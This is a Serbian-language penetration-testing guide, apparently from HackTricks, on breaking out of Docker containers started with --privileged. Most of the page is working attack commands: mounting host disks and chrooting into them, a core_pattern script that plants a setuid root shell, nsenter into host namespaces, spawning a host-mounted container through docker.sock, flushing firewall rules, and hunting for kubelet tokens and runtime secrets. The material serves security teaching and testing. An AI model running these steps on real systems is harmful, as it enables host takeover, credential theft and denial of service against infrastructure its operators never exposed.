# Izlazak iz `--privileged` kontejnera

{{#include ../../../banners/hacktricks-training.md}}

## Pregled

Kontejner pokrenut sa `--privileged` nije isto što i normalan kontejner sa jednom ili dve dodatne dozvole. U praksi, `--privileged` uklanja ili slabi nekoliko podrazumevanih runtime zaštita koje obično sprečavaju workload da pristupi opasnim resursima hosta. Tačan efekat i dalje zavisi od runtime-a i hosta, ali za Docker je uobičajen rezultat:

- dodeljuju se sve capabilities
- ograničenja device cgroup-a se uklanjaju
- mnogi kernel filesystems prestaju da budu montirani kao read-only
- podrazumevane maskirane procfs putanje nestaju
- seccomp filtering je onemogućen
- AppArmor confinement je onemogućen
- SELinux izolacija je onemogućena ili zamenjena mnogo širim labelom

Važna posledica je da privilegovani kontejner obično **ne** zahteva suptilan kernel exploit. U mnogim slučajevima može jednostavno direktno da komunicira sa host uređajima, kernel filesystem-ima koji su dostupni sa hosta ili runtime interfejsima, a zatim da pređe u host shell.

## Šta `--privileged` Ne Menja Automatski

`--privileged` ne pridružuje automatski kontejner host PID, network, IPC ili UTS namespace-u. Privilegovani kontejner i dalje može imati privatne namespace-ove. To znači da neki escape chain-ovi zahtevaju dodatni uslov, kao što je:

- bind mount hosta
- deljenje host PID-a
- host networking
- vidljivi host uređaji
- writable proc/sys interfejsi

Ove uslove je često lako ispuniti kod stvarnih misconfigurations, ali su konceptualno odvojeni od samog `--privileged`.

## Escape Paths

### 1. Montiranje Host Diska Kroz Izložene Uređaje

Privilegovani kontejner obično vidi mnogo više device node-ova u okviru `/dev`. Ako je host block device vidljiv, najjednostavniji escape je da se on montira i da se pomoću `chroot` pređe u host filesystem:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
Ako root particija nije očigledna, prvo izlistajte raspored blokova:
```bash
fdisk -l 2>/dev/null
blkid 2>/dev/null
debugfs /dev/sda1 2>/dev/null
```
Ako je praktičan pristup postaviti setuid helper u host mount sa dozvolom upisa umesto korišćenja `chroot`, imajte na umu da svaki filesystem ne podržava setuid bit. Brza provera mogućnosti sa host strane je:
```bash
mount | grep -v "nosuid"
```
Ovo je korisno zato što su putanje sa dozvolom upisa unutar `nosuid` filesystem-a mnogo manje zanimljive za klasične workflow-e tipa „ubaci setuid shell i izvrši ga kasnije“.

Zloupotrebljene oslabljene zaštite su:

- potpuna izloženost uređaja
- široke capabilities, naročito `CAP_SYS_ADMIN`

Povezane stranice:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

### 2. Montirajte ili ponovo koristite Host Bind Mount i `chroot`

Ako je root filesystem hosta već montiran unutar containera ili container može da kreira potrebne mount-ove zato što je privileged, do shell-a hosta često deli vas samo jedan `chroot`:
```bash
mount | grep -E ' /host| /mnt| /rootfs'
ls -la /host 2>/dev/null
chroot /host /bin/bash 2>/dev/null || /host/bin/bash -p
```
Ako ne postoji bind mount za host root, ali je host storage dostupan, kreirajte ga:
```bash
mkdir -p /tmp/host
mount --bind / /tmp/host
chroot /tmp/host /bin/bash 2>/dev/null
```
Ovaj path zloupotrebljava:

- oslabljena ograničenja mountovanja
- potpune capabilities
- nedostatak MAC confinement-a

Povezane stranice:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

### 3. Zloupotreba upisivog `/proc/sys` ili `/sys`

Jedna od velikih posledica opcije `--privileged` jeste to što zaštite procfs-a i sysfs-a postaju znatno slabije. To može izložiti kernel interfejse usmerene ka hostu, koji su obično maskirani ili mountovani samo za čitanje.

Klasičan primer je `core_pattern`:
```bash
[ -w /proc/sys/kernel/core_pattern ] || exit 1
overlay=$(mount | sed -n 's/.*upperdir=\([^,]*\).*/\1/p' | head -n1)
cat <<'EOF' > /shell.sh
#!/bin/sh
cp /bin/sh /tmp/rootsh
chmod u+s /tmp/rootsh
EOF
chmod +x /shell.sh
echo "|$overlay/shell.sh" > /proc/sys/kernel/core_pattern
cat <<'EOF' > /tmp/crash.c
int main(void) {
char buf[1];
for (int i = 0; i < 100; i++) buf[i] = 1;
return 0;
}
EOF
gcc /tmp/crash.c -o /tmp/crash
/tmp/crash
ls -l /tmp/rootsh
```
Ostale putanje visoke vrednosti obuhvataju:
```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
cat /proc/sys/fs/binfmt_misc/status 2>/dev/null
find /proc/sys -maxdepth 3 -writable 2>/dev/null | head -n 50
find /sys -maxdepth 4 -writable 2>/dev/null | head -n 50
```
Ovaj path zloupotrebljava:

- nedostajuće maskirane putanje
- nedostajuće read-only sistemske putanje

Povezane stranice:

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

### 4. Korišćenje svih capabilities za mount- ili namespace-based escape

Privileged container dobija capabilities koje se obično uklanjaju iz standardnih containera, uključujući `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`, `CAP_SYS_MODULE`, `CAP_NET_ADMIN` i mnoge druge. To je često dovoljno da se lokalni foothold pretvori u host escape čim postoji još neka izložena površina.

Jednostavan primer je montiranje dodatnih filesystema i korišćenje namespace entry-ja:
```bash
capsh --print | grep cap_sys_admin
which nsenter
nsenter -t 1 -m -u -n -i -p sh 2>/dev/null || echo "host namespace entry blocked"
```
Ako se deli i PID hosta, korak postaje još kraći:
```bash
ps -ef | head -n 50
nsenter -t 1 -m -u -n -i -p /bin/bash
```
Ovaj scenario zloupotrebljava:

- podrazumevani skup privilegovanih capabilities
- opciono deljenje host PID-a

Povezane stranice:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

### 5. Escape kroz Runtime Socket-e

Privileged container često dobija pristup stanju ili socket-ima host runtime-a. Ako je Docker, containerd ili CRI-O socket dostupan, najjednostavniji pristup je često korišćenje runtime API-ja za pokretanje drugog container-a sa pristupom host-u:
```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock \) 2>/dev/null
docker -H unix:///var/run/docker.sock run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Za containerd:
```bash
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
```
Ovaj put zloupotrebljava:

- izloženost privileged runtime-a
- host bind mounts kreirane kroz sam runtime

Povezane stranice:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
runtime-api-and-daemon-exposure.md
{{#endref}}

### 6. Uklonite neželjene efekte izolacije mreže

`--privileged` sam po sebi ne priključuje container host network namespace-u, ali ako container takođe koristi `--network=host` ili drugi pristup host mreži, čitav network stack postaje podložan izmenama:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Ovo nije uvek direktan host shell, ali može omogućiti denial of service, presretanje saobraćaja ili pristup management servisima dostupnim samo preko loopback interfejsa.

Povezane stranice:

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}

### 7. Čitanje Host Secrets I Runtime Stanja

Čak i kada clean shell escape nije odmah moguć, privileged containers često imaju dovoljan pristup za čitanje host secrets, kubelet stanja, runtime metapodataka i filesystema susednih containers:
```bash
find /var/lib /run /var/run -maxdepth 3 -type f 2>/dev/null | head -n 100
find /var/lib/kubelet -type f -name token 2>/dev/null | head -n 20
find /var/lib/containerd -type f 2>/dev/null | head -n 50
```
Ako je `/var` montiran sa hosta ili su runtime direktorijumi vidljivi, ovo može biti dovoljno za lateral movement ili krađu cloud/Kubernetes credentials čak i pre dobijanja host shell-a.

Povezane stranice:

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
sensitive-host-mounts.md
{{#endref}}

## Provere

Svrha sledećih komandi je da potvrde koje porodice privileged-container escape tehnika su odmah izvodljive.
```bash
capsh --print                                    # Confirm the expanded capability set
mount | grep -E '/proc|/sys| /host| /mnt'        # Check for dangerous kernel filesystems and host binds
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null   # Check for host block devices
grep Seccomp /proc/self/status                   # Confirm seccomp is disabled
cat /proc/self/attr/current 2>/dev/null          # Check whether AppArmor/SELinux confinement is gone
find / -maxdepth 3 -name '*.sock' 2>/dev/null    # Look for runtime sockets
```
Šta je ovde interesantno:

- kompletan skup capabilities, naročito `CAP_SYS_ADMIN`
- izloženost `proc/sys` putanja sa dozvolom upisa
- vidljivi uređaji hosta
- nedostatak seccomp-a i MAC ograničenja
- runtime socket-i ili bind mount-ovi root direktorijuma hosta

Bilo šta od navedenog može biti dovoljno za post-exploitation. Nekoliko ovih stvari zajedno obično znači da je kontejner funkcionalno udaljen od kompromitacije hosta svega jednu ili dve komande.

## Povezane stranice

{{#ref}}
protections/capabilities.md
{{#endref}}

{{#ref}}
protections/seccomp.md
{{#endref}}

{{#ref}}
protections/apparmor.md
{{#endref}}

{{#ref}}
protections/selinux.md
{{#endref}}

{{#ref}}
protections/masked-paths.md
{{#endref}}

{{#ref}}
protections/read-only-paths.md
{{#endref}}

{{#ref}}
protections/namespaces/mount-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/pid-namespace.md
{{#endref}}

{{#ref}}
protections/namespaces/network-namespace.md
{{#endref}}
{{#include ../../../banners/hacktricks-training.md}}
